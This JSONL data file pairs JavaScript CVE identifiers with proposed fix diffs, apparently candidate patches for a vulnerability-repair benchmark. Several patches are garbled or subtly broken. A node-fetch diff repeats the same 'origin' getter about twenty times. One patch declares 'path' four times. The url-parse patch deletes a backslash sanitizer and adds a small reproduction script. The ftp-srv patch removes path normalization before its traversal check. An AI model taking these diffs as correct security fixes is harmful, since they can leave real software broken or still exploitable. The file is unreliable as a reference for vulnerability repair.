{\n+                                headers.set('Content-Type', contentType);\n+                        }\n+                }\n+\n+                let signal = isRequest(input) ?\n+                        input.signal :\n+                        null;\n+                if ('signal' in init) {\n+                        signal = init.signal;\n+                }\n+\n+                // eslint-disable-next-line no-eq-null, eqeqeq\n+                if (signal != null && !isAbortSignal(signal)) {\n+                        throw new TypeError('Expected signal to be an instanceof AbortSignal or EventTarget');\n+                }\n+\n+                // \u00a75.4, Request constructor steps, step 15.1\n+                // eslint-disable-next-line no-eq-null, eqeqeq\n+                let referrer = init.referrer == null ? input.referrer : init.referrer;\n+                if (referrer === '') {\n+                        // \u00a75.4, Request constructor steps, step 15.2\n+                        referrer = 'no-referrer';\n+                } else if (referrer) {\n+                        // \u00a75.4, Request constructor steps, step 15.3.1, 15.3.2\n+                        const parsedReferrer = new URL(referrer);\n+                        // \u00a75.4, Request constructor steps, step 15.3.3, 15.3.4\n+                        referrer = /^about:(\\/\\/)?client$/.test(parsedReferrer) ? 'client' : parsedReferrer;\n+                } else {\n+                        referrer = undefined;\n+                }\n+\n+                this[INTERNALS] = {\n+                        method,\n+                        redirect: init.redirect || input.redirect || 'follow',\n+                        headers,\n+                        parsedURL,\n+                        signal,\n+                        referrer\n+                };\n+\n+                // Node-fetch-only options\n+                this.follow = init.follow === undefined ? (input.follow === undefined ? 20 : input.follow) : init.follow;\n+                this.compress = init.compress === undefined ? (input.compress === undefined ? true : input.compress) : init.compress;\n+                this.counter = init.counter || input.counter || 0;\n+                this.agent = init.agent || input.agent;\n+                this.highWaterMark = init.highWaterMark || input.highWaterMark || 16384;\n+                this.insecureHTTPParser = init.insecureHTTPParser || input.insecureHTTPParser || false;\n+\n+                // \u00a75.4, Request constructor steps, step 16.\n+                // Default is empty string per https://fetch.spec.whatwg.org/#concept-request-referrer-policy\n+                this.referrerPolicy = init.referrerPolicy || input.referrerPolicy || '';\n+        }\n+\n+        /** @returns {string} */\n+        get method() {\n+                return this[INTERNALS].method;\n+        }\n+\n+        /** @returns {string} */\n+        get url() {\n+                return formatUrl(this[INTERNALS].parsedURL);\n+        }\n+\n+        /** @returns {Headers} */\n+        get headers() {\n+                return this[INTERNALS].headers;\n+        }\n+\n+        get redirect() {\n+                return this[INTERNALS].redirect;\n+        }\n+\n+        /** @returns {AbortSignal} */\n+        get signal() {\n+                return this[INTERNALS].signal;\n+        }\n+\n+        // https://fetch.spec.whatwg.org/#dom-request-referrer\n+        get referrer() {\n+                if (this[INTERNALS].referrer === 'no-referrer') {\n+                        return '';\n+                }\n+\n+                if (this[INTERNALS].referrer === 'client') {\n+                        return 'about:client';\n+                }\n+\n+                if (this[INTERNALS].referrer) {\n+                        return this[INTERNALS].referrer.toString();\n+                }\n+\n+                return undefined;\n+        }\n+\n+        get referrerPolicy() {\n+                return this[INTERNALS].referrerPolicy;\n+        }\n+\n+        set referrerPolicy(referrerPolicy) {\n+                this[INTERNALS].referrerPolicy = validateReferrerPolicy(referrerPolicy);\n+        }\n+        }\n+\n+get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+\n+        get origin() {\n+        return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        /**\n+         * Clone this request\n+         *\n+         * @return  Request\n+         */\n+        get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+        get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+        get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+        get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+        get origin() {                                                                                                                                                                                                   \n+        return this[INTERNALS].parsedURL.origin;                                                                                                                                                                         \n+        }                                                                                                                                                                                                                   \n+                                                                                                                                                                                                                            \n+        get origin() {\n+return this[INTERNALS].parsedURL.origin;\n+}\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        clone() {\n+                return new Request(this);\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n+\n+        get [Symbol.toStringTag]() {\n+                return 'Request';\n+        }\n+\n+        get origin() {\n+                return this[INTERNALS].parsedURL.origin;\n+        }\n }\n \n Object.defineProperties(Request.prototype, {\n-\tmethod: {enumerable: true},\n-\turl: {enumerable: true},\n-\theaders: {enumerable: true},\n-\tredirect: {enumerable: true},\n-\tclone: {enumerable: true},\n-\tsignal: {enumerable: true},\n-\treferrer: {enumerable: true},\n-\treferrerPolicy: {enumerable: true}\n+        method: {enumerable: true},\n+        url: {enumerable: true},\n+        headers: {enumerable: true},\n+        redirect: {enumerable: true},\n+        clone: {enumerable: true},\n+        signal: {enumerable: true},\n+        referrer: {enumerable: true},\n+        referrerPolicy: {enumerable: true},\n+        origin: {enumerable: true}\n });\n \n /**\n@@ -222,94 +305,94 @@ Object.defineProperties(Request.prototype, {\n  * @return The options object to be passed to http.request\n  */\n export const getNodeRequestOptions = request => {\n-\tconst {parsedURL} = request[INTERNALS];\n-\tconst headers = new Headers(request[INTERNALS].headers);\n-\n-\t// Fetch step 1.3\n-\tif (!headers.has('Accept')) {\n-\t\theaders.set('Accept', '*/*');\n-\t}\n-\n-\t// HTTP-network-or-cache fetch steps 2.4-2.7\n-\tlet contentLengthValue = null;\n-\tif (request.body === null && /^(post|put)$/i.test(request.method)) {\n-\t\tcontentLengthValue = '0';\n-\t}\n-\n-\tif (request.body !== null) {\n-\t\tconst totalBytes = getTotalBytes(request);\n-\t\t// Set Content-Length if totalBytes is a number (that is not NaN)\n-\t\tif (typeof totalBytes === 'number' && !Number.isNaN(totalBytes)) {\n-\t\t\tcontentLengthValue = String(totalBytes);\n-\t\t}\n-\t}\n-\n-\tif (contentLengthValue) {\n-\t\theaders.set('Content-Length', contentLengthValue);\n-\t}\n-\n-\t// 4.1. Main fetch, step 2.6\n-\t// > If request's referrer policy is the empty string, then set request's referrer policy to the\n-\t// > default referrer policy.\n-\tif (request.referrerPolicy === '') {\n-\t\trequest.referrerPolicy = DEFAULT_REFERRER_POLICY;\n-\t}\n-\n-\t// 4.1. Main fetch, step 2.7\n-\t// > If request's referrer is not \"no-referrer\", set request's referrer to the result of invoking\n-\t// > determine request's referrer.\n-\tif (request.referrer && request.referrer !== 'no-referrer') {\n-\t\trequest[INTERNALS].referrer = determineRequestsReferrer(request);\n-\t} else {\n-\t\trequest[INTERNALS].referrer = 'no-referrer';\n-\t}\n-\n-\t// 4.5. HTTP-network-or-cache fetch, step 6.9\n-\t// > If httpRequest's referrer is a URL, then append `Referer`/httpRequest's referrer, serialized\n-\t// >  and isomorphic encoded, to httpRequest's header list.\n-\tif (request[INTERNALS].referrer instanceof URL) {\n-\t\theaders.set('Referer', request.referrer);\n-\t}\n-\n-\t// HTTP-network-or-cache fetch step 2.11\n-\tif (!headers.has('User-Agent')) {\n-\t\theaders.set('User-Agent', 'node-fetch');\n-\t}\n-\n-\t// HTTP-network-or-cache fetch step 2.15\n-\tif (request.compress && !headers.has('Accept-Encoding')) {\n-\t\theaders.set('Accept-Encoding', 'gzip,deflate,br');\n-\t}\n-\n-\tlet {agent} = request;\n-\tif (typeof agent === 'function') {\n-\t\tagent = agent(parsedURL);\n-\t}\n-\n-\tif (!headers.has('Connection') && !agent) {\n-\t\theaders.set('Connection', 'close');\n-\t}\n-\n-\t// HTTP-network fetch step 4.2\n-\t// chunked encoding is handled by Node.js\n-\n-\tconst search = getSearch(parsedURL);\n-\n-\t// Pass the full URL directly to request(), but overwrite the following\n-\t// options:\n-\tconst options = {\n-\t\t// Overwrite search to retain trailing ? (issue #776)\n-\t\tpath: parsedURL.pathname + search,\n-\t\t// The following options are not expressed in the URL\n-\t\tmethod: request.method,\n-\t\theaders: headers[Symbol.for('nodejs.util.inspect.custom')](),\n-\t\tinsecureHTTPParser: request.insecureHTTPParser,\n-\t\tagent\n-\t};\n-\n-\treturn {\n-\t\t/** @type {URL} */\n-\t\tparsedURL,\n-\t\toptions\n-\t};\n+        const {parsedURL} = request[INTERNALS];\n+        const headers = new Headers(request[INTERNALS].headers);\n+\n+        // Fetch step 1.3\n+        if (!headers.has('Accept')) {\n+                headers.set('Accept', '*/*');\n+        }\n+\n+        // HTTP-network-or-cache fetch steps 2.4-2.7\n+        let contentLengthValue = null;\n+        if (request.body === null && /^(post|put)$/i.test(request.method)) {\n+                contentLengthValue = '0';\n+        }\n+\n+        if (request.body !== null) {\n+                const totalBytes = getTotalBytes(request);\n+                // Set Content-Length if totalBytes is a number (that is not NaN)\n+                if (typeof totalBytes === 'number' && !Number.isNaN(totalBytes)) {\n+                        contentLengthValue = String(totalBytes);\n+                }\n+        }\n+\n+        if (contentLengthValue) {\n+                headers.set('Content-Length', contentLengthValue);\n+        }\n+\n+        // 4.1. Main fetch, step 2.6\n+        // > If request's referrer policy is the empty string, then set request's referrer policy to the\n+        // > default referrer policy.\n+        if (request.referrerPolicy === '') {\n+                request.referrerPolicy = DEFAULT_REFERRER_POLICY;\n+        }\n+\n+        // 4.1. Main fetch, step 2.7\n+        // > If request's referrer is not \"no-referrer\", set request's referrer to the result of invoking\n+        // > determine request's referrer.\n+        if (request.referrer && request.referrer !== 'no-referrer') {\n+                request[INTERNALS].referrer = determineRequestsReferrer(request);\n+        } else {\n+                request[INTERNALS].referrer = 'no-referrer';\n+        }\n+\n+        // 4.5. HTTP-network-or-cache fetch, step 6.9\n+        // > If httpRequest's referrer is a URL, then append `Referer`/httpRequest's referrer, serialized\n+        // >  and isomorphic encoded, to httpRequest's header list.\n+        if (request[INTERNALS].referrer instanceof URL) {\n+                headers.set('Referer', request.referrer);\n+        }\n+\n+        // HTTP-network-or-cache fetch step 2.11\n+        if (!headers.has('User-Agent')) {\n+                headers.set('User-Agent', 'node-fetch');\n+        }\n+\n+        // HTTP-network-or-cache fetch step 2.15\n+        if (request.compress && !headers.has('Accept-Encoding')) {\n+                headers.set('Accept-Encoding', 'gzip,deflate,br');\n+        }\n+\n+        let {agent} = request;\n+        if (typeof agent === 'function') {\n+                agent = agent(parsedURL);\n+        }\n+\n+        if (!headers.has('Connection') && !agent) {\n+                headers.set('Connection', 'close');\n+        }\n+\n+        // HTTP-network fetch step 4.2\n+        // chunked encoding is handled by Node.js\n+\n+        const search = getSearch(parsedURL);\n+\n+        // Pass the full URL directly to request(), but overwrite the following\n+        // options:\n+        const options = {\n+                // Overwrite search to retain trailing ? (issue #776)\n+                path: parsedURL.pathname + search,\n+                // The following options are not expressed in the URL\n+                method: request.method,\n+                headers: headers[Symbol.for('nodejs.util.inspect.custom')](),\n+                insecureHTTPParser: request.insecureHTTPParser,\n+                agent\n+        };\n+\n+        return {\n+                /** @type {URL} */\n+                parsedURL,\n+                options\n+        };\n };\n"}
{"cve":"CVE-2024-29041:0708", "fix_patch": "diff --git a/lib/response.js b/lib/response.js\nindex fede486c..d40e7c4e 100644\n--- a/lib/response.js\n+++ b/lib/response.js\n@@ -906,10 +906,16 @@ res.cookie = function (name, value, options) {\n res.location = function location(url) {\n   var loc = url;\n \n-  // \"back\" is an alias for the referrer\n-  if (url === 'back') {\n-    loc = this.req.get('Referrer') || '/';\n-  }\n+\\t  // \"back\" is an alias for the referrer\n+\\t  if (url === 'back') {\n+\\t    loc = this.req.get('Referrer') || '/';\n+\\t  }\n+\n+\\t  // handle slashes for modern browsers\n+\\t  if (/^\\\\/|^\\/\\//.test(loc)) {\n+\\t    // a path starting with '\\' or '//' is a potential open redirect, so sanitize it\n+\\t    loc = '//' + loc.replace(/^\\\\/|^\\/\\//, '');\n+\\t  }\n \n   // set location\n   return this.set('Location', encodeUrl(loc));\n"}
{"cve":"CVE-2021-3664:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 94e357e..3d797f7 100644\n--- a/index.js\n+++ b/index.js\n@@ -2,7 +2,7 @@\n \n var required = require('requires-port')\n   , qs = require('querystringify')\n-  , slashes = /^[A-Za-z][A-Za-z0-9+-.]*:[\\\\/]+/\n+  , slashes = /^[A-Za-z][A-Za-z0-9+-.]*:\\/\\//\n   , protocolre = /^([a-z][a-z0-9.+-]*:)?([\\\\/]{1,})?([\\S\\s]*)/i\n   , whitespace = '[\\\\x09\\\\x0A\\\\x0B\\\\x0C\\\\x0D\\\\x20\\\\xA0\\\\u1680\\\\u180E\\\\u2000\\\\u2001\\\\u2002\\\\u2003\\\\u2004\\\\u2005\\\\u2006\\\\u2007\\\\u2008\\\\u2009\\\\u200A\\\\u202F\\\\u205F\\\\u3000\\\\u2028\\\\u2029\\\\uFEFF]'\n   , left = new RegExp('^'+ whitespace +'+');\n@@ -32,9 +32,7 @@ function trimLeft(str) {\n var rules = [\n   ['#', 'hash'],                        // Extract from the back.\n   ['?', 'query'],                       // Extract from the back.\n-  function sanitize(address) {          // Sanitize what is left of the address\n-    return address.replace(/\\\\/g, '/');\n-  },\n+ \n   ['/', 'pathname'],                    // Extract from the back.\n   ['@', 'auth', 1],                     // Extract from the front.\n   [NaN, 'host', undefined, 1, 1],       // Set left over value.\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..a2e374a\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,3 @@\n+const Url = require('./index.js');\n+var u = new Url('https:\\\\/\\\\/google.com');\n+console.log(u.hostname);\n"}
{"cve":"CVE-2022-0155:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 6f0c238..f5559eb 100644\n--- a/index.js\n+++ b/index.js\n@@ -392,9 +392,9 @@ RedirectableRequest.prototype._processResponse = function (response) {\n     var redirectUrlParts = url.parse(redirectUrl);\n     Object.assign(this._options, redirectUrlParts);\n \n-    // Drop the Authorization header if redirecting to another domain\n+    // Drop the Authorization and Cookie headers if redirecting to another domain\n     if (!(redirectUrlParts.host === currentHost || isSubdomainOf(redirectUrlParts.host, currentHost))) {\n-      removeMatchingHeaders(/^authorization$/i, this._options.headers);\n+      removeMatchingHeaders(/^(?:authorization|cookie|cookie2)$/i, this._options.headers);\n     }\n \n     // Evaluate the beforeRedirect callback\n"}
{"cve":"CVE-2021-46561:0708", "fix_patch": "diff --git a/src/controller/org.controller/org.controller.js b/src/controller/org.controller/org.controller.js\nindex 0673f06b..96178785 100644\n--- a/src/controller/org.controller/org.controller.js\n+++ b/src/controller/org.controller/org.controller.js\n@@ -499,6 +499,10 @@ async function updateUser (req, res, next) {\n       if (key === 'new_username') {\n         newUser.username = req.ctx.query.new_username\n       } else if (key === 'org_shortname') {\n+        if (!req.ctx.user.isSecretariat) {\n+          logger.info({ message: user.username + ' can not be moved to a new organization because the requester is not a Secretariat user.' })\n+          return res.status(403).json({ message: 'A user can only be moved to a new organization by a Secretariat user.' })\n+        }\n         newOrgShortName = req.ctx.query.org_shortname\n         changesRequirePrivilegedRole = true\n       } else if (key === 'name.first') {\n"}
{"cve":"CVE-2022-0722:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex 31b2a04..fc330df 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -44,7 +44,14 @@ function parseUrl(url, normalize = false) {\n         }\n         url = normalizeUrl(url, normalize)\n     }\n-    const parsed = parsePath(url)\n+    const parsed = parsePath(url);\n+    if (parsed.user) {\n+        const credentials = parsed.password ? `${parsed.user}:${parsed.password}` : parsed.user;\n+        parsed.href = parsed.href.replace(`${credentials}@`, \"\");\n+\n+        delete parsed.user;\n+        delete parsed.password;\n+    }\n     return parsed;\n }\n \n"}
{"cve":"CVE-2020-7649:0708", "fix_patch": "diff --git a/lib/filters/index.js b/lib/filters/index.js\nindex 1e27249..a193624 100644\n--- a/lib/filters/index.js\n+++ b/lib/filters/index.js\n@@ -1,5 +1,9 @@\n const minimatch = require('minimatch');\n const pathRegexp = require('path-to-regexp');\n+const path = require('path');\n+const path = require('path');\n+const path = require('path');\n+const path = require('path');\n const qs = require('qs');\n const undefsafe = require('undefsafe');\n const replace = require('../replace-vars');\n@@ -17,7 +21,13 @@ module.exports = ruleSource => {\n     rules = ruleSource;\n   } else if (ruleSource) {\n     try {\n-      rules = require(ruleSource);\n+      const root = path.resolve(__dirname, '../..');\n+      const rulesPath = path.resolve(root, ruleSource);\n+      if (rulesPath.startsWith(root)) {\n+        rules = require(rulesPath);\n+      } else {\n+        logger.warn({ ruleSource }, 'Potentially malicious rules file detected, ignoring');\n+      }\n     } catch (error) {\n       logger.warn({ ruleSource, error }, 'Unable to parse rule source, ignoring');\n     }\n"}
{"cve":"CVE-2020-26299:0708", "fix_patch": "diff --git a/src/fs.js b/src/fs.js\nindex 3226d2e..b24760f 100644\n--- a/src/fs.js\n+++ b/src/fs.js\n@@ -9,8 +9,11 @@ const errors = require('./errors');\n class FileSystem {\n   constructor(connection, {root, cwd} = {}) {\n     this.connection = connection;\n-    this.cwd = nodePath.normalize(cwd ? nodePath.join(nodePath.sep, cwd) : nodePath.sep);\n-    this._root = nodePath.resolve(root || process.cwd());\n+    const resolvePath = (path) => {\n+      return path.replace(/\\\\/g, '/');\n+    };\n+    this.cwd = resolvePath(nodePath.normalize(cwd ? nodePath.join(nodePath.sep, cwd) : nodePath.sep));\n+    this._root = resolvePath(nodePath.resolve(root || process.cwd()));\n   }\n \n   get root() {\n@@ -19,17 +22,17 @@ class FileSystem {\n \n   _resolvePath(path = '.') {\n     const clientPath = (() => {\n-      path = nodePath.normalize(path);\n-      if (nodePath.isAbsolute(path)) {\n-        return nodePath.join(path);\n-      } else {\n-        return nodePath.join(this.cwd, path);\n-      }\n+      const resolvedPath = path.replace(/\\\\/g, '/');\n+      if (nodePath.isAbsolute(resolvedPath)) return resolvedPath;\n+      return nodePath.join(this.cwd, resolvedPath);\n     })();\n \n     const fsPath = (() => {\n       const resolvedPath = nodePath.join(this.root, clientPath);\n-      return nodePath.resolve(nodePath.normalize(nodePath.join(resolvedPath)));\n+      if (!resolvedPath.startsWith(this.root)) {\n+        throw new errors.FileSystemError('Forbidden');\n+      }\n+      return resolvedPath;\n     })();\n \n     return {\n"}
{"cve":"CVE-2021-37712:0708", "fix_patch": "diff --git a/lib/path-reservations.js b/lib/path-reservations.js\nindex 48c750e..df6db3e 100644\n--- a/lib/path-reservations.js\n+++ b/lib/path-reservations.js\n@@ -10,6 +10,17 @@ const assert = require('assert')\n const normPath = require('./normalize-windows-path.js')\n const { join } = require('path')\n \n+const seen = new Map()\n+const normalize = p => {\n+  const n = normPath(join(p)).normalize('NFC')\n+  const s = seen.get(n)\n+  if (s) {\n+    return s\n+  }\n+  seen.set(n, n)\n+  return n\n+}\n+\n module.exports = () => {\n   // path => [function or Set]\n   // A Set object means a directory reservation\n@@ -21,9 +32,11 @@ module.exports = () => {\n \n   // return a set of parent dirs for a given path\n   const getDirs = path =>\n-    path.split('/').slice(0, -1).reduce((set, path) =>\n-      set.length ? set.concat(normPath(join(set[set.length - 1], path)))\n-      : [path], [])\n+    path.split('/').slice(0, -1).reduce((set, path) => {\n+      const p = set.length ? join(set[set.length - 1], path) : path\n+      return set.concat(normalize(p))\n+    }, [])\n+\n \n   // functions currently running\n   const running = new Set()\n@@ -99,9 +112,9 @@ module.exports = () => {\n   }\n \n   const reserve = (paths, fn) => {\n-    paths = paths.map(p => normPath(join(p)).toLowerCase())\n+    paths = paths.map(p => normalize(p))\n     const dirs = new Set(\n-      paths.map(path => getDirs(path)).reduce((a, b) => a.concat(b))\n+      paths.map(path => getDirs(path)).reduce((a, b) => a.concat(b), [])\n     )\n     reservations.set(fn, {dirs, paths})\n     paths.forEach(path => {\n"}
{"cve":"CVE-2021-37713:0708", "fix_patch": "diff --git a/lib/strip-absolute-path.js b/lib/strip-absolute-path.js\nindex 49161dd..dc55f95 100644\n--- a/lib/strip-absolute-path.js\n+++ b/lib/strip-absolute-path.js\n@@ -1,8 +1,15 @@\n // unix absolute paths are also absolute on win32, so we use this for both\n-const { isAbsolute, parse } = require('path').win32\n+const { isAbsolute, parse, normalize } = require('path').win32\n \n // returns [root, stripped]\n module.exports = path => {\n+  // on windows, C:foo is not absolute, but C:\\foo is.\n+  // this normalizes C: to C:\\\n+  // and C:foo to C:\\foo\n+  if (/^[a-zA-Z]:/.test(path)) {\n+    path = normalize(path).replace(/^([a-zA-Z]:)(?!\\\\)/, '$1\\\\')\n+  }\n+\n   let r = ''\n   while (isAbsolute(path)) {\n     // windows will think that //x/y/z has a \"root\" of //x/y/\n"}
{"cve":"CVE-2021-32804:0708", "fix_patch": "diff --git a/lib/write-entry.js b/lib/write-entry.js\nindex 1d0b746..9e18344 100644\n--- a/lib/write-entry.js\n+++ b/lib/write-entry.js\n@@ -55,9 +55,16 @@ const WriteEntry = warner(class WriteEntry extends MiniPass {\n     if (!this.preservePaths && path.win32.isAbsolute(p)) {\n       // absolutes on posix are also absolutes on win32\n       // so we only need to test this one to get both\n-      const parsed = path.win32.parse(p)\n-      this.path = p.substr(parsed.root.length)\n-      pathWarn = parsed.root\n+      pathWarn = path.win32.parse(p).root\n+      this.path = p\n+      while (path.win32.isAbsolute(this.path)) {\n+        const r = path.win32.parse(this.path).root\n+        if (r === this.path) {\n+          this.path = ''\n+          break\n+        }\n+        this.path = this.path.substring(r.length)\n+      }\n     }\n \n     this.win32 = !!opt.win32 || process.platform === 'win32'\n"}
{"cve":"CVE-2017-16025:0708", "fix_patch": "diff --git a/lib/socket.js b/lib/socket.js\nindex 261156e..1353fd9 100755\n--- a/lib/socket.js\n+++ b/lib/socket.js\n@@ -537,13 +537,20 @@ internals.Socket.prototype._authenticate = function () {\n         return;\n     }\n \n-    this._listener._connection.states.parse(cookies, (ignoreErr, state, failed) => {\n+    try {\n+        this._listener._connection.states.parse(cookies, (ignoreErr, state) => {\n \n-        const auth = state[config.cookie];\n-        if (auth) {\n-            this.auth._error = this._setCredentials(auth.credentials, auth.artifacts);\n-        }\n-    });\n+            if (state) {\n+                const auth = state[config.cookie];\n+                if (auth) {\n+                    this.auth._error = this._setCredentials(auth.credentials, auth.artifacts);\n+                }\n+            }\n+        });\n+    }\n+    catch (err) {\n+        // Fall through\n+    }\n };\n \n \n"}
{"cve":"CVE-2021-41246:0708", "fix_patch": "diff --git a/middleware/auth.js b/middleware/auth.js\nindex c13a949..db403f4 100644\n--- a/middleware/auth.js\n+++ b/middleware/auth.js\n@@ -129,10 +129,15 @@ const auth = function (params) {\n             );\n           }\n \n-          Object.assign(req[config.session.name], session);\n-          attemptSilentLogin.resumeSilentLogin(req, res);\n-\n-          next();\n+          req.session.regenerate((err) => {\n+            if (err) {\n+              next(err);\n+              return;\n+            }\n+            Object.assign(req[config.session.name], session);\n+            attemptSilentLogin.resumeSilentLogin(req, res);\n+            next();\n+          });\n         } catch (err) {\n           // Swallow errors if this is a silentLogin\n           if (req.openidState && req.openidState.attemptingSilentLogin) {\n"}
{"cve":"CVE-2015-3295:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex abc1525..8743ba4 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -21,7 +21,7 @@ var config = {\n };\n \n \n-var BAD_PROTOCOLS    = [ 'vbscript', 'javascript', 'file' ];\n+var BAD_PROTOCOLS    = [ 'vbscript', 'javascript', 'file', 'data' ];\n \n function validateLink(url) {\n   // url should be normalized at this point, and existing entities are decoded\n"}
